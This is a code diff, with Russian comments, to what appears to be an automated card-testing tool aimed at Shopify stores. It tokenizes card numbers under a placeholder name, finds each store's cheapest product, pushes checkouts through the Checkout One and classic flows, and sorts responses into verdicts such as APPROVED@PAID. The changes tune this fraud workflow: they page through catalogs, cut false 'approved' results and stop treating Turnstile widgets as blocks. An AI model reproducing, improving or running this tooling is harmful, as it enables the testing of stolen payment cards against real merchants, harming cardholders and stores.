@@ -148,6 +148,12 @@ async def probe_shopify_variant(
         return None
 
 
+def _log_warn_legacy() -> None:
+    """След того, что сработала выведенная платформой классическая форма Shopify."""
+    print("[!] Shopify: сработала LEGACY-ветка (classic form POST) — платформа её вывела "
+          "30.06.2026. Цель пора снимать с ротации или переводить на Checkout One.")
+
+
 def _normalize_card(card_raw: str) -> dict | None:
     """Extract and validate card details, returning dict with number, mm, yy, cvc or None."""
     parsed = gc.parse_card(card_raw)
@@ -212,19 +218,37 @@ async def tokenize_shopify_card(s: AsyncSession, card: dict, name: str = "James 
 async def get_shopify_cheapest_product(
     s: AsyncSession, root: str, max_price_cents: int = MAX_PRICE_CENTS
 ) -> dict | None:
-    """Fetch product catalog via /products.json and find cheapest available variant <= max_price_cents."""
-    # limit=250: у крупных каталогов (stevemadden) дешёвые позиции за первой
-    # полусотней — finder с limit=100 их видел, движок с 50 терял
-    url = f"{root.rstrip('/')}/products.json?limit=250"
-    try:
-        r = await s.get(url, timeout=10)
-        if r.status_code != 200:
-            return None
-        data = r.json()
-        products = data.get("products", [])
-        if not products:
-            return None
+    """Ищет самый дешёвый доступный вариант <= max_price_cents по каталогу /products.json.
 
+    Эндпоинт отдаёт максимум 250 товаров на страницу и не умеет пагинацию «до конца»:
+    раньше обходили только первую страницу, поэтому у крупных каталогов дешёвые позиции
+    не находились вовсе (аудит 2026-09, G-28). Теперь страницы листаются до
+    config.SHOPIFY_CATALOG_PAGES, а обход прекращается, как только страница неполная.
+    """
+    base = root.rstrip("/")
+    products = []
+    for page in range(1, max(1, int(config.SHOPIFY_CATALOG_PAGES)) + 1):
+        url = f"{base}/products.json?limit=250&page={page}"
+        try:
+            r = await s.get(url, timeout=10)
+            if r.status_code != 200:
+                break
+            page_products = (r.json() or {}).get("products", []) or []
+        except Exception:
+            break
+        if not page_products:
+            break
+        products.extend(page_products)
+        if page > 1:
+            print(f"[*] Shopify: {base} — каталог листается (страница {page}, "
+                  f"товаров на руках: {len(products)})")
+        if len(page_products) < 250:
+            break
+
+    if not products:
+        return None
+
+    try:
         candidates = []
         for p in products:
             for v in p.get("variants", []):
@@ -269,10 +293,14 @@ def classify_shopify_verdict(raw_data: Any, context_str: str = "") -> tuple[str,
     if "processingreceipt" in text:
         return "PI_PENDING", "Order is processing on Shopify (pollDelay in receipt)"
 
-    # Success / Paid orders
+    # Success / Paid orders.
+    # "submitsuccess" из списка убран: SubmitSuccess — это контейнер ответа, под которым
+    # приходит и FailedReceipt, поэтому маркер давал APPROVED@PAID на обычном деклайне
+    # (аудит 2026-09, H-10a: ложный успех хуже ложного отказа). Оплата подтверждается
+    # только телом квитанции — ProcessedReceipt.
     if any(k in text for k in [
         "processedreceipt", "order_paid", "order_placed", "orderstatuspageurl",
-        "ordersucceeded", "thank_you", "submitsuccess", "checkout_completed",
+        "ordersucceeded", "thank_you", "checkout_completed",
         "/thank-you", "/orders/"
     ]):
         return "APPROVED@PAID", "Order placed / payment completed on Shopify"
@@ -318,7 +346,10 @@ def classify_shopify_verdict(raw_data: Any, context_str: str = "") -> tuple[str,
     if any(k in text for k in ["throttled", "too_many_requests", "rate_limited", "rate limit"]):
         return "RATE_LIMITED", "Rate limited by store/gateway"
 
-    if any(k in text for k in ["checkpointdenied", "cf-turnstile-wrapper", "challenge-platform", "just a moment..."]):
+    # cf-turnstile-wrapper из списка убран: это контейнер ЛЕГИТИМНОГО виджета на чекаут-странице,
+    # а не блок-страница Cloudflare. Маркер снимали в gate_client (CRIT-03), в Shopify-ветке он
+    # остался и отбраковывал живые чекауты (аудит 2026-09, H-10 / B-01).
+    if any(k in text for k in ["checkpointdenied", "challenge-platform", "just a moment...", "verify you are human"]):
         return "ERROR", "Turnstile / Cloudflare bot protection checkpoint"
 
     if "submitrejected" in text or "submitfailed" in text or "failedreceipt" in text or "declined" in text:
@@ -418,9 +449,22 @@ async def shopify_confirm(
                 "target": root,
             }
 
-    # 4. Initiate checkout via GET /checkout
+    # 4. Инициация чекаута. Предпочитаем checkout_url из Cart API (/cart.js): он каноничен
+    #    для текущей локали и сессии корзины, тогда как жёсткий /checkout даёт лишний редирект
+    #    (аудит 2026-09: Cart API — рекомендованный путь, /checkout — просто удобный шорткат).
+    checkout_url = f"{root}/checkout"
     try:
-        r_chk = await s.get(f"{root}/checkout", allow_redirects=True, timeout=15)
+        r_cart = await s.get(f"{root}/cart.js", timeout=10)
+        if r_cart.status_code == 200:
+            cart_url = (r_cart.json() or {}).get("checkout_url") or ""
+            if cart_url.startswith("/"):
+                checkout_url = f"{root}{cart_url}"
+            elif cart_url.startswith("http"):
+                checkout_url = cart_url
+    except Exception:
+        pass
+    try:
+        r_chk = await s.get(checkout_url, allow_redirects=True, timeout=15)
         chk_url = str(r_chk.url)
         html = r_chk.text
     except Exception as e:
@@ -645,7 +689,13 @@ async def shopify_confirm(
                     "target": root,
                     "variant_id": variant_id,
                     "product_title": product_title,
+                    # Какая ветка отработала: важно для миграции — Checkout One internal API
+                    # не версионирован и помечен unstable (аудит 2026-09, H-07/G-06).
+                    "flow": "checkout_one_graphql",
                 }
+            if r_mut.status_code == 404:
+                print("[!] Shopify: /checkouts/unstable/graphql отдал 404 — внутренний маршрут "
+                      "выведен. Checkout One ветка сломана, смотри чейнджлог Shopify.")
         except Exception as e:
             return {
                 "status": "ERROR",
@@ -655,7 +705,9 @@ async def shopify_confirm(
                 "target": root,
             }
 
-    # 5B. Flow B: Classic Shopify multi-step checkout form POST
+    # 5B. Flow B: классическая форма. Платформа её вывела (sunset checkout.liquid 30.06.2026),
+    #     поэтому ветка оставлена только как последний резерв и явно помечается в логе:
+    #     если она срабатывает на боевых целях — значит пора убирать (аудит 2026-09, G-18).
     auth_tokens = re.findall(r'name=["\']authenticity_token["\']\s+value=["\']([^"\']+)["\']', html)
     if not auth_tokens:
         auth_tokens = re.findall(r'value=["\']([^"\']+)["\']\s+name=["\']authenticity_token["\']', html)
@@ -667,6 +719,7 @@ async def shopify_confirm(
         gateways = re.findall(r'value=["\']([0-9]{5,15})["\'][^>]*name=["\']checkout\[payment_gateway\]["\']', html)
 
     if auth_tokens and gateways:
+        _log_warn_legacy()
         gw_id = gateways[0]
         token = auth_tokens[0]
         form_data = {
@@ -698,6 +751,7 @@ async def shopify_confirm(
                 "target": root,
                 "variant_id": variant_id,
                 "product_title": product_title,
+                "flow": "classic_form",  # выведенная платформой ветка — только для телеметрии миграции
             }
         except Exception as e:
             return {
